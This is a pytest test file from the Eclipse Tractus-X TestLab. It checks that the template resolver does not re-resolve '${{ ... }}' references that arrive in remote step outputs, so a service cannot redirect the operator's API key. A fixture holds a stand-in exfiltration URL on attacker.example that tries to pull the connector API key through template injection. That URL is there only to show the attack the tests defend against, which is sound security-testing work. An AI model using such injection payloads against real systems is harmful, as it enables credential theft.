################################################################################
# Eclipse Tractus-X - Tractus-X TestLab
#
# Copyright (c) 2026 Contributors to the Eclipse Foundation
#
# See the NOTICE file(s) distributed with this work for additional
# information regarding copyright ownership.
#
# This program and the accompanying materials are made available under the
# terms of the Apache License, Version 2.0 which is available at
# https://www.apache.org/licenses/LICENSE-2.0.
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.
#
# SPDX-License-Identifier: Apache-2.0
################################################################################
## This code was partially generated using artificial intelligence (AI) (Tool: Claude Code, Model: Claude Opus 5.5).
## It was reviewed and tested by a human committer.

"""What a run learns while it runs is data: a ``${{ ... }}`` in it is never resolved.

A step output carries what a remote service answered. Resolving the references
inside it let that service choose what the next step is given — an answer
holding ``${{ infrastructure.sut.connector.api_key }}``, read by the next step
as ``url: ${{ execution.fetch.endpoint }}``, had the engine send the operator's
key to an address of the service's choosing. Only what the TCK package carries
— test data and static ``env`` values, whose references the author wrote — is
resolved again when read.
"""

from __future__ import annotations

import pytest

from tractusx_testlab.config.settings import TestlabConfig
from tractusx_testlab.models import Job
from tractusx_testlab.player.execution.context import StepContext
from tractusx_testlab.player.loading.resolver import (
    MAX_TEMPLATE_DEPTH,
    TemplateDepthError,
    resolve_params,
    try_resolve_params,
)
from tractusx_testlab.services.instances import ServiceManager

_KEY = "OPERATOR-SECRET-KEY"
_PAYLOAD = "https://attacker.example/collect?stolen=${{ infrastructure.sut.connector.api_key }}"


@pytest.fixture()
def context() -> StepContext:
    context = StepContext(
        services=ServiceManager(), job=Job(job_id="run-1"), config=TestlabConfig()
    )
    context.set_variable("infrastructure.sut.connector.api_key", _KEY)
    return context


class TestAnswersAreData:
    def test_a_step_output_holding_a_reference_is_handed_over_verbatim(
        self, context: StepContext
    ) -> None:
        context.set_variable("execution.fetch_edr.endpoint", _PAYLOAD)

        resolved = resolve_params({"url": "${{ execution.fetch_edr.endpoint }}"}, context)

        assert resolved["url"] == _PAYLOAD
        assert _KEY not in str(resolved)

    def test_nor_inside_a_structured_output(self, context: StepContext) -> None:
        context.set_variable("execution.call.response_body", {"next": {"url": _PAYLOAD}})

        resolved = resolve_params({"body": "${{ execution.call.response_body }}"}, context)

        assert resolved["body"] == {"next": {"url": _PAYLOAD}}

    def test_nor_when_interpolated(self, context: StepContext) -> None:
        context.set_variable("execution.fetch_edr.endpoint", _PAYLOAD)

        resolved = resolve_params({"url": "${{ execution.fetch_edr.endpoint }}/x"}, context)

        assert resolved["url"] == f"{_PAYLOAD}/x"

    def test_a_self_referencing_answer_does_not_end_the_run(self, context: StepContext) -> None:
        context.set_variable("execution.loop.value", "${{ execution.loop.value }}")

        resolved = resolve_params({"v": "${{ execution.loop.value }}"}, context)

        assert resolved["v"] == "${{ execution.loop.value }}"

    def test_an_operator_input_is_data_too(self, context: StepContext) -> None:
        # A SUT-side input is typed by the party under test.
        context.set_template("callback", "${{ infrastructure.sut.connector.api_key }}")
        context.set_variable("callback", _PAYLOAD)

        assert resolve_params({"u": "${{ env.callback }}"}, context)["u"] == _PAYLOAD


class TestAuthoredContentIsResolved:
    def test_test_data_names_env_values(self, context: StepContext) -> None:
        context.set_variable("provider_bpn", "BPNL000000000001")
        context.set_template(
            "testdata.body", {"header": {"receiverBpn": "${{ env.provider_bpn }}"}}
        )

        resolved = resolve_params({"body": "${{ env.testdata.body }}"}, context)

        assert resolved["body"] == {"header": {"receiverBpn": "BPNL000000000001"}}

    def test_but_what_it_names_is_read_as_data(self, context: StepContext) -> None:
        context.set_variable("execution.fetch_edr.endpoint", _PAYLOAD)
        context.set_template("testdata.body", {"url": "${{ execution.fetch_edr.endpoint }}"})

        resolved = resolve_params({"body": "${{ env.testdata.body }}"}, context)

        assert resolved["body"] == {"url": _PAYLOAD}

    def test_a_cycle_is_a_reportable_error_not_a_crash(self, context: StepContext) -> None:
        context.set_template("testdata.a", "${{ env.testdata.b }}")
        context.set_template("testdata.b", "${{ env.testdata.a }}")

        with pytest.raises(TemplateDepthError):
            resolve_params({"x": "${{ env.testdata.a }}"}, context)
        # A TestLabError, so the phase runner hands the block on instead of dying.
        assert try_resolve_params({"x": "${{ env.testdata.a }}"}, context) is None

    def test_a_deep_but_finite_chain_resolves(self, context: StepContext) -> None:
        depth = MAX_TEMPLATE_DEPTH - 1
        for i in range(depth):
            context.set_template(f"testdata.t{i}", f"${{{{ env.testdata.t{i + 1} }}}}")
        context.set_template(f"testdata.t{depth}", "end")

        assert resolve_params({"x": "${{ env.testdata.t0 }}"}, context)["x"] == "end"
